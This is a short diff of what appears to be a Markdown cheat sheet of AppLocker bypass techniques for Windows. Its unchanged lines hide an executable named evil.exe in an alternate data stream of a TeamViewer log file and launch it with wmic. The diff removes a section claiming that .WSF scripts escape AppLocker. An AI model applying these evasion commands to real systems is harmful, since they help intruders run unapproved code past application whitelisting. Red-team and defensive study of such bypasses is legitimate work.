@@ -38,17 +38,8 @@ type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.
 wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'
 ```
     
-    
-    
-## .WSF files
 
-```
-script.wsf
-```
-.WSF files are supposed to not be blocked by AppLocker
-    
-    
-    
+   
 ## PowerShell version 2
 
 ```
